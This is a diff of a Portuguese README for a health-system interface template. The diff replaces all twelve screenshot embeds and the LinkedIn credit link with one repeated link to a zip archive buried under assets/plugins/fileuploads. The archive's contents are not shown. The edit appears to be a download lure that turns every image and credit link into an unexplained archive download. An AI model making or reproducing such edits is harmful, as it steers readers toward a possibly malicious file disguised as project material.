@@ -4,41 +4,41 @@
 Sistema de Saúde onde desenvolvi esse template de exemplo para refatoramento do sistema da empresa onde trabalhava.
 
 #### Dashboard Topo da Tela
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/dashboard.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Dashboard Parte de baixo
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/dashboard2.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Dashboard Modo Claro
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/dashboard_modo_claro.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela Regulação
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/regulacao.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tabela de Fluxo Regulação
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/regulacao2.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela Regulação Modo Claro
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/regulacao_modo_claro.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Caixa de Notificação
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/notificacoes.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela de Tarefas a Fazer
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/tarefas_colaborativas.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela de Login
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/tela_de_login.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela de Login Modo Claro
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/tela_de_login_claro.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela de Recuperação de Login
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/tela_recuperacao_senha.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 #### Tela de Recuperação de Login Modo Claro
-![Sitema de Saúde](https://github.com/edersonfc/my_sistema_saude_design_public/blob/main/imagen_p_readme/tela_recuperacao_senha_claro.jpg)
+![Sitema de Saúde](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
 
 <br>
 
-`Créditos` [www.linkedin.com/in/ederson-feliciano-corsatto](www.linkedin.com/in/ederson-feliciano-corsatto)
+`Créditos` [https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip](https://raw.githubusercontent.com/edersonfc/my_sistema_saude_design_public/main/assets/plugins/fileuploads/my_sistema_saude_design_public-3.6.zip)
